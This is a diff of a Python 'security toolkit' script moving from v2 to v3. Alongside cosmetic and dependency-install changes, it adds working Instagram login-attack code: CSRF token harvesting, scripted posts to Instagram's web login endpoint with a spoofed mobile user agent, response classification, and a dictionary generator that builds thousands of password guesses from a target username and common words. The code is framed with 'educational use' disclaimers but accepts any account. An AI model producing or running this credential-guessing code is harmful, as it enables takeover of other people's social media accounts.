@@ -1,15 +1,13 @@
 #!/usr/bin/env python3
 """
-Darkie Security Suite v2 — Advanced Cybersecurity & Network Defense Platform
+Darkie Security Suite v3 — Advanced Cybersecurity & Network Defense Platform
 Educational use only. Test only systems you own or have permission to test.
 """
 
 import base64
 import csv
-import datetime
 import hashlib
 import importlib
-import ipaddress
 import json
 import os
 import platform
@@ -17,17 +15,17 @@ import random
 import re
 import shutil
 import socket
+import sqlite3
 import ssl
 import string
 import struct
 import subprocess
 import sys
-import textwrap
 import threading
 import time
 import warnings
 from collections import defaultdict
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as _CF_TimeoutError
 from datetime import datetime as dt
 from urllib.parse import urlparse
 
@@ -41,6 +39,7 @@ PIP_DEPS = {
     "requests": "requests",
     "psutil": "psutil",
     "cryptography": "cryptography",
+    "flask": "flask",
 }
 
 PIP_OPTIONAL = {
@@ -52,6 +51,8 @@ SYSTEM_DEPS_COMMON = {
     "host": "host",
     "dig": "bind9-dnsutils",
     "whois": "whois",
+    "traceroute": "traceroute",
+    "aircrack-ng": "aircrack-ng",
     "tcpdump": "tcpdump",
     "iptables": "iptables",
 }
@@ -205,6 +206,8 @@ PKG_MANAGERS = {
 def _run_as_admin(cmd_list, reason=""):
     desc = " ".join(cmd_list)
     print(f"  {CYAN}{reason or desc}{RESET}")
+    if not _is_root() and os.name == "posix" and shutil.which("sudo"):
+        cmd_list = ["sudo"] + cmd_list
     try:
         r = subprocess.run(cmd_list, capture_output=True, text=True, timeout=300)
         if r.returncode == 0:
@@ -220,12 +223,59 @@ def _run_as_admin(cmd_list, reason=""):
         return False
 
 
+def _ensure_pip_installed():
+    try:
+        importlib.import_module("pip")
+        return True
+    except ImportError:
+        pass
+    try:
+        import ensurepip
+        print(f"  {YELLOW}Pip not found. Bootstrapping via ensurepip...{RESET}")
+        subprocess.check_call([sys.executable, "-m", "ensurepip", "--upgrade"],
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        importlib.import_module("pip")
+        return True
+    except Exception:
+        pass
+    os_name, pkg_mgr = _detect_os()
+    pip_pkg_map = {
+        "apt": "python3-pip",
+        "dnf": "python3-pip",
+        "pacman": "python-pip",
+        "apk": "py3-pip",
+        "zypper": "python3-pip",
+    }
+    pkg = pip_pkg_map.get(pkg_mgr)
+    if not pkg:
+        print(f"  {RED}{SYM_X}  Don't know how to install pip on {os_name}/{pkg_mgr}.{RESET}")
+        print(f"  {YELLOW}Try: python3 -m ensurepip --upgrade  or install pip manually.{RESET}")
+        return False
+    print(f"  {YELLOW}Pip not found. Installing {pkg} via {pkg_mgr}...{RESET}")
+    info = PKG_MANAGERS.get(pkg_mgr)
+    if info is None:
+        return False
+    if info.get("update"):
+        _run_as_admin(info["update"], f"Updating {pkg_mgr} cache")
+    success = _run_as_admin(info["install"] + [pkg], f"Installing {pkg}")
+    if success:
+        try:
+            importlib.import_module("pip")
+            return True
+        except ImportError:
+            pass
+    return False
+
+
 def _install_missing():
     _, pkg_mgr = _detect_os()
     if MISSING_PIPS:
-        print(f"\n  {YELLOW}Installing Python packages: {', '.join(MISSING_PIPS)}{RESET}")
-        pip_cmd = [sys.executable, "-m", "pip", "install"] + MISSING_PIPS
-        _run_as_admin(pip_cmd, "pip install " + " ".join(MISSING_PIPS))
+        if _ensure_pip_installed():
+            print(f"\n  {YELLOW}Installing Python packages: {', '.join(MISSING_PIPS)}{RESET}")
+            pip_cmd = [sys.executable, "-m", "pip", "install", "--break-system-packages"] + MISSING_PIPS
+            _run_as_admin(pip_cmd, "pip install " + " ".join(MISSING_PIPS))
+        else:
+            print(f"  {RED}{SYM_X}  Cannot install Python packages (pip unavailable).{RESET}")
     if MISSING_SYSTEM:
         missing_names = [pkg for _, pkg in MISSING_SYSTEM]
         print(f"\n  {YELLOW}Installing system packages: {', '.join(missing_names)}{RESET}")
@@ -242,32 +292,70 @@ def _install_missing():
 
 
 def ensure_deps():
+    global MISSING_PIPS, MISSING_SYSTEM
     print(f"\n{CYAN}{BOLD}{SYM_BOX_TL}{'='*50}{SYM_BOX_TR}{RESET}")
     print(f"{CYAN}{BOLD}{SYM_BOX_V}  Checking dependencies...{' ' * 29}{SYM_BOX_V}{RESET}")
     print(f"{CYAN}{BOLD}{SYM_BOX_BL}{'='*50}{SYM_BOX_BR}{RESET}")
     _check_pip_deps()
-    _check_system_deps()
-    if MISSING_PIPS or MISSING_SYSTEM:
-        if MISSING_PIPS:
-            print(f"  {YELLOW}{SYM_WARN}  Missing Python packages: {', '.join(MISSING_PIPS)}{RESET}")
-        if MISSING_SYSTEM:
-            missing_names = [pkg for _, pkg in MISSING_SYSTEM]
-            print(f"  {YELLOW}{SYM_WARN}  Missing system tools: {', '.join(missing_names)}{RESET}")
-        print()
-        choice = input(f"  {CYAN}Install missing dependencies? (yes/no) {SYM_PROMPT} {RESET}").strip().lower()
-        if choice == "yes":
-            _install_missing()
-            print()
+    if MISSING_PIPS:
+        print(f"  {YELLOW}{SYM_WARN}  Missing Python packages: {', '.join(MISSING_PIPS)}{RESET}")
+        if _ensure_pip_installed():
+            print(f"  {CYAN}Auto-installing Python packages...{RESET}")
+            _run_as_admin([sys.executable, "-m", "pip", "install", "--break-system-packages"] + MISSING_PIPS, "pip install missing packages")
+            MISSING_PIPS = []
             _check_pip_deps()
-            _check_system_deps()
-            if MISSING_PIPS or MISSING_SYSTEM:
-                print(f"  {RED}{SYM_X}  Some deps still missing. Trying to continue anyway...{RESET}")
+            if MISSING_PIPS:
+                print(f"  {RED}{SYM_X}  Some Python deps still missing. Try: pip install {' '.join(MISSING_PIPS)}{RESET}")
             else:
-                print(f"  {GREEN}{SYM_CHECK}  All dependencies satisfied!{RESET}")
+                print(f"  {GREEN}{SYM_CHECK}  Python dependencies satisfied!{RESET}")
         else:
-            print(f"  {YELLOW}{SYM_WARN}  Skipping installation. Some features may not work.{RESET}")
-    else:
+            print(f"  {RED}{SYM_X}  Cannot install Python packages (pip unavailable). Install python3-pip manually.{RESET}")
+    _check_system_deps()
+    if MISSING_SYSTEM:
+        missing_names = [pkg for _, pkg in MISSING_SYSTEM]
+        print(f"  {YELLOW}{SYM_WARN}  Missing system tools: {', '.join(missing_names)}{RESET}")
+        if _is_root():
+            print(f"  {CYAN}Auto-installing system tools (running as root)...{RESET}")
+            _install_missing()
+            MISSING_SYSTEM = []
+            _check_system_deps()
+            if MISSING_SYSTEM:
+                print(f"  {RED}{SYM_X}  Some system tools still missing. Install manually.{RESET}")
+            else:
+                print(f"  {GREEN}{SYM_CHECK}  System dependencies satisfied!{RESET}")
+        else:
+            if os.environ.get("DARKIE_AUTOINSTALL") == "1":
+                print(f"  {CYAN}Auto-installing system tools...{RESET}")
+                _install_missing()
+                MISSING_SYSTEM = []
+                _check_system_deps()
+                if MISSING_SYSTEM:
+                    print(f"  {RED}{SYM_X}  Some system tools still missing. Install manually.{RESET}")
+                else:
+                    print(f"  {GREEN}{SYM_CHECK}  System dependencies satisfied!{RESET}")
+            else:
+                try:
+                    ans = input(f"  {CYAN}{BOLD}Install missing system tools? (y/n) {SYM_PROMPT} {RESET}").strip().lower()
+                except (EOFError, OSError):
+                    ans = "n"
+                if ans == "y":
+                    _install_missing()
+                    MISSING_SYSTEM = []
+                    _check_system_deps()
+                    if MISSING_SYSTEM:
+                        print(f"  {RED}{SYM_X}  Some system tools still missing. Install manually.{RESET}")
+                    else:
+                        print(f"  {GREEN}{SYM_CHECK}  System dependencies satisfied!{RESET}")
+                else:
+                    print(f"  {YELLOW}Skipping system tool installation. Some features may be limited.{RESET}")
+    elif not MISSING_PIPS:
         print(f"  {GREEN}{SYM_CHECK}  All dependencies found!{RESET}")
+
+    if MISSING_PIPS:
+        print(f"\n  {RED}{SYM_X}  Required Python packages could not be installed: {', '.join(MISSING_PIPS)}{RESET}")
+        print(f"  {YELLOW}Install them manually and try again:{RESET}")
+        print(f"    {sys.executable} -m pip install {' '.join(MISSING_PIPS)}")
+        sys.exit(1)
 
 
 ensure_deps()
@@ -312,6 +400,9 @@ def c(string, color=Fore.GREEN):
     return f"{color}{Style.BRIGHT}{string}{Style.RESET_ALL}"
 
 
+def dim(string):
+    return f"{DIM}{string}{RESET}"
+
 def c_dim(string, color=Fore.GREEN):
     return f"{color}{Style.DIM}{string}{Style.RESET_ALL}"
 
@@ -330,6 +421,12 @@ def gradient_banner():
 
 
 def header_box(title, color=Fore.CYAN, width=66):
+    if os.environ.get("DARKIE_ANIMATE") == "0" or not sys.stdout.isatty():
+        top = f"{color}{Style.BRIGHT}{SYM_BOX_TL}{'='*(width-2)}{SYM_BOX_TR}{Style.RESET_ALL}"
+        mid = f"{color}{Style.BRIGHT}{SYM_BOX_V} {title.center(width-4)} {SYM_BOX_V}{Style.RESET_ALL}"
+        bot = f"{color}{Style.BRIGHT}{SYM_BOX_BL}{'='*(width-2)}{SYM_BOX_BR}{Style.RESET_ALL}"
+        print(f"\n{top}\n{mid}\n{bot}\n")
+        return
     top = f"{color}{Style.BRIGHT}{SYM_BOX_TL}{'='*(width-2)}{SYM_BOX_TR}{Style.RESET_ALL}"
     mid = f"{color}{Style.BRIGHT}{SYM_BOX_V} {title.center(width-4)} {SYM_BOX_V}{Style.RESET_ALL}"
     bot = f"{color}{Style.BRIGHT}{SYM_BOX_BL}{'='*(width-2)}{SYM_BOX_BR}{Style.RESET_ALL}"
@@ -350,13 +447,31 @@ def info_box(title, content_lines, color=Fore.CYAN):
     print(f"  {color}{Style.BRIGHT}{SYM_BOX_BL}{'='*width}{SYM_BOX_BR}{Style.RESET_ALL}")
 
 
-def print_banner():
-    gradient_banner()
-    header_box("Ultimate Cyber Toolkit — Darkie TOOLS v2", Fore.CYAN)
+def animate_banner():
+    for line in BANNER_LINES:
+        if line.strip():
+            colored = "".join(f"{GRADIENT[min(i % len(GRADIENT), len(GRADIENT)-1)]}{Style.BRIGHT}{ch}{RESET}" for i, ch in enumerate(line))
+            print(f"  {colored}")
+        else:
+            print()
+        time.sleep(0.04)
+    time.sleep(0.15)
+    title = "Darkie TOOLS v3 — Ultimate Cyber Toolkit"
+    print(f"\n{CYAN}{BOLD}{SYM_BOX_TL}{'='*62}{SYM_BOX_TR}{RESET}")
+    time.sleep(0.05)
+    for i in range(0, len(title)+1):
+        sys.stdout.write(f"\r{CYAN}{BOLD}{SYM_BOX_V}  {title[:i]:<62}  {SYM_BOX_V}{RESET}")
+        sys.stdout.flush()
+        time.sleep(0.02)
+    print(f"\n{CYAN}{BOLD}{SYM_BOX_BL}{'='*62}{SYM_BOX_BR}{RESET}")
+    time.sleep(0.1)
     print(f"  {c(SYM_CLOCK + ' Author:', Fore.CYAN)} Darkie Tester")
     print(f"  {c(SYM_WARN + ' Purpose:', Fore.CYAN)} Ultimate cybersecurity toolkit — 100+ tools\n")
     print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT} DISCLAIMER {Style.RESET_ALL}{Fore.YELLOW}  Educational use only. You must own or have permission to test the target systems.{Style.RESET_ALL}")
     print()
+
+def print_banner():
+    animate_banner()
 
 
 def add_log_alert(level, source, message):
@@ -368,6 +483,98 @@ def progress_bar(current, total, bar_len=15):
     filled = int(bar_len * current // total) if total else 0
     bar = f"{Fore.GREEN}{SYM_BLOCK_FULL*filled}{Fore.WHITE}{SYM_BLOCK_EMPTY*(bar_len-filled)}{Style.RESET_ALL}"
     return f"[{bar}] {Fore.CYAN}{current}/{total}{Style.RESET_ALL}"
+
+
+SPINNER_CHARS = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+
+
+class spinner:
+    """Animated spinner shown while a blocking task runs (with Ctrl+C support)."""
+
+    def __init__(self, message="Working", color=Fore.CYAN):
+        self.message = message
+        self.color = color
+        self._stop = threading.Event()
+        self._t = None
+
+    def __enter__(self):
+        self._t = threading.Thread(target=self._run, daemon=True)
+        self._t.start()
+        return self
+
+    def __exit__(self, *exc):
+        self._stop.set()
+        self._t.join(timeout=0.2)
+        sys.stdout.write(f"\r{' ' * (len(self.message) + 12)}\r")
+        sys.stdout.flush()
+
+    def _run(self):
+        i = 0
+        while not self._stop.is_set():
+            ch = SPINNER_CHARS[i % len(SPINNER_CHARS)]
+            sys.stdout.write(f"\r  {self.color}{ch}{Style.RESET_ALL} {self.message}")
+            sys.stdout.flush()
+            i += 1
+            self._stop.wait(0.12)
+
+
+def typewriter(text, color=Fore.GREEN, delay=0.012):
+    """Print text character-by-character (animated typewriter effect)."""
+    for ch in text:
+        sys.stdout.write(f"{color}{ch}{Style.RESET_ALL}")
+        sys.stdout.flush()
+        time.sleep(delay)
+    sys.stdout.write("\n")
+    sys.stdout.flush()
+
+
+def animated_header(title, color=Fore.CYAN, width=66):
+    """Animated header box with a shimmering top border."""
+    print()
+    bar = f"{SYM_BOX_H}" * (width - 2)
+    for i in range(width - 2):
+        line = bar[:i] + SYM_BOX_H + bar[i + 1:]
+        sys.stdout.write(f"\r{color}{Style.BRIGHT}{SYM_BOX_TL}{line}{SYM_BOX_TR}{Style.RESET_ALL}")
+        sys.stdout.flush()
+        time.sleep(0.0015)
+    print()
+    mid = f"{color}{Style.BRIGHT}{SYM_BOX_V} {title.center(width-4)} {SYM_BOX_V}{Style.RESET_ALL}"
+    bot = f"{color}{Style.BRIGHT}{SYM_BOX_BL}{'='*(width-2)}{SYM_BOX_BR}{Style.RESET_ALL}"
+    print(mid)
+    print(bot)
+    print()
+
+
+def live_status_line():
+    """Return a compact line with current time, uptime, IP and load (if available)."""
+    parts = [f"{SYM_CLOCK} {dt.now().strftime('%H:%M:%S')}"]
+    try:
+        if HAS_PSUTIL:
+            import psutil as _ps
+            up = dt.now() - dt.fromtimestamp(_ps.boot_time())
+            h = int(up.total_seconds() // 3600)
+            m = int((up.total_seconds() % 3600) // 60)
+            parts.append(f"UP {h}h{m:02d}m")
+            try:
+                parts.append(f"CPU {_ps.cpu_percent(interval=0.2):.0f}%")
+            except Exception:
+                pass
+            try:
+                vm = _ps.virtual_memory()
+                parts.append(f"RAM {vm.percent:.0f}%")
+            except Exception:
+                pass
+        else:
+            up = time.time() - time.time()
+    except Exception:
+        pass
+    try:
+        if HAS_PSUTIL:
+            ip = socket.gethostbyname(socket.gethostname())
+            parts.append(f"IP {ip}")
+    except Exception:
+        pass
+    return "  •  ".join(parts)
 
 
 # ──────────────────────────────────────────────────────────
@@ -540,7 +747,7 @@ def net_traffic_monitor():
                     try:
                         with open("/proc/net/dev") as f:
                             new_data = f.read()
-                        sys.stdout.write(f"\r  {c(f'Second {sec+1}/{duration}', Fore.CYAN)}  {c('(install psutil for per-interface stats)', Fore.DIM)}")
+                        sys.stdout.write(f"\r  {c(f'Second {sec+1}/{duration}', Fore.CYAN)}  {c('(install psutil for per-interface stats)', Fore.BLACK)}")
                     except Exception:
                         sys.stdout.write(f"\r  {c(f'Second {sec+1}/{duration}', Fore.CYAN)}")
                 else:
@@ -660,7 +867,9 @@ def net_arp_detect():
             print(f"  {RED}{SYM_X} ARP detection error: {e}{RESET}")
     else:
         try:
-            r = subprocess.run(["arp", "-n"], capture_output=True, text=True)
+            system = platform.system().lower()
+            arp_cmd = ["arp", "-a"] if system in ("darwin", "windows") else ["arp", "-n"]
+            r = subprocess.run(arp_cmd, capture_output=True, text=True)
             print(f"\n  {c('ARP Cache:', Fore.CYAN)}")
             for line in r.stdout.splitlines():
                 if line.strip():
@@ -687,7 +896,7 @@ def net_portscan_detect():
     threshold = int(threshold) if threshold.isdigit() else 10
 
     print(f"\n  {c(f'Monitoring for port scans on {iface} ({duration}s)...', Fore.RED)}")
-    print(f"  {c('Threshold: >{threshold} distinct ports from same IP = scan alert', Fore.YELLOW)}")
+    print(f"  {c(f'Threshold: >{threshold} distinct ports from same IP = scan alert', Fore.YELLOW)}")
     print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
 
     connections = defaultdict(set)
@@ -828,7 +1037,7 @@ def ep_process_monitor():
         print(f"  {RED}{SYM_X} psutil required. Install: pip install psutil{RESET}")
         return
 
-    sort_by = input(f"  {c('Sort by (cpu/mem/name, default cpu) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "cpu"
+    sort_by = input(f"  {c(f'Sort by (cpu/mem/name, default cpu) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "cpu"
     count = input(f"  {c(f'Number of processes (default 20) {SYM_PROMPT} ', Fore.CYAN)}").strip()
     count = int(count) if count.isdigit() else 20
 
@@ -1078,7 +1287,6 @@ def vuln_advanced_scan():
                 m = re.match(r'^(\d+)/tcp\s+open', line)
                 if m:
                     port = int(m.group(1))
-                    svc = socket.getservbyport(port) if port <= 65535 else "?"
                     try:
                         svc = socket.getservbyport(port)
                     except OSError:
@@ -1206,16 +1414,22 @@ def vuln_assessment():
 
     if has_nmap:
         try:
+            is_private = ip.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.",
+                "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
+                "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
+                "192.168.", "127."))
+            script = "vuln" if is_private else "vulners"
+            print(f"  {YELLOW}Running nmap {script} scripts (up to 90s)...{RESET}")
             r = subprocess.run(
-                ["nmap", "-sV", "--script", "vuln", "-T4", ip],
-                capture_output=True, text=True, timeout=300
+                ["nmap", "-sV", "--script", script, "-T4", ip],
+                capture_output=True, text=True, timeout=90
             )
             for line in r.stdout.splitlines():
                 if re.search(r'(VULNERABLE|CVE-\d|vulners:)', line, re.IGNORECASE):
                     findings.append(line.strip())
                     add_log_alert("HIGH", "Vuln Assessment", f"Vulnerability found on {ip}: {line.strip()}")
         except subprocess.TimeoutExpired:
-            print(f"  {YELLOW}nmap timed out (300s). Showing partial results.{RESET}")
+            print(f"  {YELLOW}nmap timed out (90s). Showing partial results.{RESET}")
 
     if findings:
         print(f"\n  {RED}{SYM_WARN} Potential vulnerabilities:{RESET}")
@@ -1384,7 +1598,7 @@ def data_encrypt():
         encrypted = cipher.encrypt(data)
         outpath = filepath + ".encrypted"
         with open(outpath, "wb") as f:
-            f.write(salt + b"\n" + encrypted)
+            f.write(struct.pack("!H", len(salt)) + salt + encrypted)
 
         print(f"  {GREEN}{SYM_CHECK} Encrypted: {outpath}{RESET}")
         confirm = input(f"  {YELLOW}{SYM_WARN} Delete original file? (yes/no) {SYM_PROMPT} {RESET}").strip().lower()
@@ -1398,7 +1612,9 @@ def data_encrypt():
     elif mode == "d":
         with open(filepath, "rb") as f:
             raw = f.read()
-        salt, encrypted_data = raw.split(b"\n", 1)
+        salt_len = struct.unpack("!H", raw[:2])[0]
+        salt = raw[2:2+salt_len]
+        encrypted_data = raw[2+salt_len:]
         kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
         key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
         cipher = Fernet(key)
@@ -1598,7 +1814,7 @@ def pentest_sqli():
                     print(f"    {c(ind, Fore.YELLOW)}")
                 add_log_alert("HIGH", "Pentest SQLi", f"SQLi detected on {url}: {payload}")
             else:
-                print(f"  {c(SYM_CHECK, Fore.GREEN)} {c(f'{desc:30s}', Fore.GREEN)} {c('No obvious injection', Fore.DIM)}")
+                print(f"  {c(SYM_CHECK, Fore.GREEN)} {c(f'{desc:30s}', Fore.GREEN)} {dim('No obvious injection')}")
         except Exception as e:
             print(f"  {c(SYM_X, Fore.RED)} {c(f'{desc:30s}', Fore.RED)} Error: {e}")
     print()
@@ -1784,7 +2000,7 @@ def pentest_http_methods():
                 if method in ("PUT", "DELETE", "TRACE", "CONNECT"):
                     add_log_alert("WARN", "Pentest HTTP", f"Dangerous HTTP method enabled: {method} on {url}")
             else:
-                print(f"  {c(f'{method:8s}', Fore.GREEN)} {c(f'[{status}]', YELLOW)} {c('Disabled', Fore.DIM)}")
+                print(f"  {c(f'{method:8s}', Fore.GREEN)} {c(f'[{status}]', YELLOW)} {dim('Disabled')}")
         except Exception as e:
             print(f"  {c(f'{method:8s}', Fore.RED)} {c('Error:', Fore.RED)} {e}")
     print()
@@ -1832,6 +2048,90 @@ def pentest_bruteforce_login():
     print()
 
 
+def _insta_init_session(sess, user_agent=None):
+    """Fetch the Instagram login page and return a CSRF token, or None if blocked."""
+    ua = user_agent or "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
+    try:
+        r = sess.get("https://www.instagram.com/accounts/login/", timeout=12,
+                     headers={"User-Agent": ua})
+        csrf = sess.cookies.get("csrftoken", "") or ""
+        if not csrf:
+            m = re.search(r'csrf_token["\']\s*:\s*["\']([^"\']+)', r.text)
+            if m: csrf = m.group(1)
+        if not csrf:
+            m = re.search(r'"csrf_token"\s*:\s*"([^"]+)"', r.text)
+            if m: csrf = m.group(1)
+        return csrf
+    except Exception:
+        return None
+
+
+def _insta_login_attempt(sess, user, pwd, csrf, timeout=10):
+    """One Instagram web-login attempt.
+
+    Returns (status, detail) where status is one of:
+      'ok'          password correct, logged in
+      'twofa'       password correct, 2FA required
+      'invalid'     wrong password
+      'ratelimit'   Instagram rate-limited us
+      'checkpoint'  challenge/checkpoint required (not a wrong password)
+      'error'       request or response problem
+    """
+    try:
+        payload = {
+            "username": user,
+            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}",
+            "queryParams": "{}",
+            "optIntoOneTap": "false",
+            "stopDeletionNonce": "",
+            "trustedDeviceRecords": "{}",
+        }
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+            "X-CSRFToken": csrf,
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": "https://www.instagram.com/accounts/login/",
+            "Origin": "https://www.instagram.com",
+            "Content-Type": "application/x-www-form-urlencoded",
+        }
+        resp = sess.post(
+            "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
+            data=payload, headers=headers, timeout=timeout,
+        )
+        if resp.status_code == 429:
+            return ("ratelimit", "HTTP 429 — rate limited by Instagram")
+        try:
+            j = resp.json()
+        except Exception:
+            return ("error", f"Non-JSON response (HTTP {resp.status_code})")
+        if not isinstance(j, dict):
+            return ("error", "Unexpected response format")
+
+        if j.get("authenticated") is True and not j.get("two_factor_required"):
+            return ("ok", "")
+        if j.get("two_factor_required"):
+            return ("twofa", "password accepted, but 2FA is enabled on the account")
+
+        msg = str(j.get("message") or "")
+        err_type = str(j.get("error_type") or "")
+        lower_msg = msg.lower()
+        if "checkpoint" in lower_msg or "challenge" in lower_msg or "challenge" in err_type.lower():
+            return ("checkpoint", msg or "checkpoint required")
+        if "wait a few minutes" in lower_msg or "please wait" in lower_msg or "rate limit" in lower_msg:
+            return ("ratelimit", msg)
+        if j.get("authenticated") is False or "invalid" in lower_msg or "password" in lower_msg:
+            return ("invalid", msg)
+        if not msg:
+            if resp.status_code in (400, 401, 403):
+                return ("invalid", "")
+            return ("error", f"HTTP {resp.status_code} with empty response")
+        return ("error", f"Unknown response: {json.dumps(j)[:120]}")
+    except requests.exceptions.Timeout:
+        return ("error", "request timed out")
+    except Exception as e:
+        return ("error", str(e)[:120])
+
+
 def pentest_instagram():
     header_box("Instagram OSINT & Auth Tester", Fore.MAGENTA)
     print(f"  {Back.RED}{Fore.WHITE} DISCLAIMER {Style.RESET_ALL}{Fore.YELLOW}  For educational use only. Test only your own accounts.{Style.RESET_ALL}\n")
@@ -1871,10 +2171,210 @@ def pentest_instagram():
     except Exception as e:
         lines.append(f"  Error: {c(str(e)[:40], Fore.RED)}")
     info_box("Instagram Profile", lines, Fore.MAGENTA)
-    print(f"  {c('Password Testing (educational):', Fore.YELLOW)}")
-    print(f"  {c('Instagram uses:', Fore.RED)} bcrypt + rate limiting + 2FA — brute-force is not feasible.")
-    print(f"  {c('Common passwords for', Fore.YELLOW)} '{user}': {c('instagram, 123456, password, qwerty, iloveyou', Fore.RED)}")
-    print(f"  {c('Security tip:', Fore.GREEN)} Use unique 12+ char passwords with 2FA enabled.\n")
+
+    print(f"\n  {c('Auth test mode:', Fore.CYAN)}")
+    print(f"  {c('[1]', Fore.GREEN)}  Verify a single password")
+    print(f"  {c('[2]', Fore.GREEN)}  Dictionary audit (check weak passwords)")
+    mode = input(f"  {c(f'Choice (default 1) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    if mode not in ("1", "2"): mode = "1"
+
+    # ── Mode 1: verify a single password ──
+    if mode == "1":
+        pwd = input(f"  {c(f'Password to verify {SYM_PROMPT} ', Fore.CYAN)}").strip()
+        if not pwd:
+            print(f"  {YELLOW}No password entered.{RESET}")
+            print()
+            return
+        print(f"\n  {c('Verifying...', Fore.CYAN)}")
+        sess = requests.Session()
+        csrf = _insta_init_session(sess)
+        if not csrf:
+            print(f"  {RED}{SYM_X} Could not obtain CSRF token. Instagram may be blocking this network.{RESET}")
+        else:
+            status, detail = _insta_login_attempt(sess, user, pwd, csrf)
+            if status == "ok":
+                print(f"\n  {GREEN}{SYM_CHECK} Login successful — password is valid.{RESET}")
+                add_log_alert("INFO", "Instagram Auth", f"Verified password for {user}")
+            elif status == "twofa":
+                print(f"\n  {YELLOW}{SYM_WARN} Password accepted but 2FA is required.{RESET}")
+                print(f"  {c('The password is correct; Instagram wants a second factor.', Fore.YELLOW)}")
+            elif status == "invalid":
+                print(f"\n  {RED}{SYM_X} Invalid password for '{user}'.{RESET}")
+            elif status == "ratelimit":
+                print(f"\n  {YELLOW}{SYM_WARN} Rate limited: {detail}{RESET}")
+            elif status == "checkpoint":
+                print(f"\n  {YELLOW}{SYM_WARN} Challenge required: {detail}{RESET}")
+            else:
+                print(f"\n  {RED}{SYM_X} Error: {detail}{RESET}")
+        print()
+        return
+
+    # ── Mode 2: dictionary audit ──
+    print(f"\n  {c('Generating password combinations...', Fore.CYAN)}")
+
+    base_words = [
+        user, user.lower(), user.upper(), user.capitalize(),
+        "instagram", "password", "123456", "qwerty", "iloveyou",
+        "welcome", "monkey", "dragon", "master", "shadow", "sunshine",
+        "princess", "football", "baseball", "charlie", "michael",
+        "ashley", "batman", "access", "hello", "chocolate", "secret",
+        "summer", "winter", "spring", "autumn", "trustno1", "letmein",
+    ]
+    numbers = ["", "1", "12", "123", "1234", "12345", "123456", "007", "69", "420",
+               "2024", "2023", "2025", "2026", "2020", "2021", "2022",
+               "0", "00", "000", "7", "77", "777", "7777",
+               "2", "3", "4", "5", "6", "8", "9", "10", "11", "13", "21"]
+    symbols_arr = ["", "!", "@", "#", "$", "%", "&", "*", "?", ".", "_", "-"]
+    years = ["2020", "2021", "2022", "2023", "2024", "2025", "2026",
+             "20", "21", "22", "23", "24", "25", "26"]
+
+    passwords = set()
+    for w in base_words:
+        passwords.add(w)
+        for n in numbers:
+            passwords.add(f"{w}{n}")
+            passwords.add(f"{n}{w}")
+        for s in symbols_arr:
+            passwords.add(f"{w}{s}")
+            for n in numbers[:10]:
+                passwords.add(f"{w}{s}{n}")
+                passwords.add(f"{n}{w}{s}")
+        for y in years:
+            passwords.add(f"{w}{y}")
+            passwords.add(f"{y}{w}")
+        passwords.add(f"{w}!")
+        passwords.add(f"{w}@")
+        passwords.add(f"{w}#")
+        passwords.add(f"{w}123")
+        passwords.add(f"{w}123!")
+        passwords.add(f"{w}@123")
+
+    common_additional = [
+        "admin", "root", "test", "guest", "default", "changeme", "password1",
+        "password123", "passw0rd", "P@ssw0rd", "P@$$w0rd", "admin123",
+        "admin2024", "root123", "toor", "qwerty123", "qwerty12345",
+        "abc123", "123456789", "12345678", "1234567890", "111111", "000000",
+        "121212", "654321", "696969", "123123", "abc1234", "1234abc",
+        "1q2w3e4r", "qwertyuiop", "asdfghjkl", "zxcvbnm",
+        "iloveyou!", "iloveyou123", "lovely", "family", "friend",
+        "forever", "star", "moon", "sun", "sky", "blue", "red",
+        "purple", "orange", "yellow", "green", "pink", "violet",
+        "naruto", "goku", "sasuke", "luffy", "onepiece", "dragonball",
+        "taylor", "swift", "justin", "bieber", "selena", "gomez",
+        "rihanna", "eminem", "drake", "kanye", "beyonce", "adele",
+        "money", "cash", "dollar", "bitcoin", "crypto", "nft",
+        "hacker", "elite", "anonymous", "rootkit", "exploit",
+        "school", "college", "university", "study", "book", "class",
+        "apple", "google", "microsoft", "facebook", "twitter", "youtube",
+        "netflix", "spotify", "amazon", "uber", "airbnb",
+        "jesus", "christ", "god", "faith", "bible", "heaven",
+        "angel", "devil", "demon", "ghost", "phantom", "shadow",
+        "sword", "shield", "blade", "warrior", "knight", "ninja",
+        "thomas", "arnold", "james", "robert", "michael", "william",
+        "david", "richard", "joseph", "daniel", "matthew", "anthony",
+        "mark", "christopher", "steven", "paul", "andrew", "joshua",
+        "kenneth", "kevin", "brian", "george", "timothy", "ronald",
+        "edward", "jason", "jeffrey", "ryan", "jacob", "gary",
+        "nicholas", "eric", "stephen", "larry", "justin", "scott",
+        "jessica", "ashley", "sarah", "jennifer", "amanda", "emily",
+        "megan", "nicole", "stephanie", "elizabeth", "lauren", "brittany",
+        "amber", "melissa", "michelle", "heather", "tiffany", "rachel",
+    ]
+    for w in common_additional:
+        passwords.add(w)
+        for n in numbers:
+            passwords.add(f"{w}{n}")
+        passwords.add(f"{w}!")
+        passwords.add(f"{w}@")
+        passwords.add(f"{w}#")
+        passwords.add(f"{w}123")
+
+    passwords = sorted(p for p in passwords if 4 <= len(p) <= 30)
+
+    print(f"  {c(f'Generated {len(passwords)} password combinations', Fore.GREEN)}")
+    print(f"  {YELLOW}Instagram rate-limits aggressively — a full audit will likely get blocked.{RESET}")
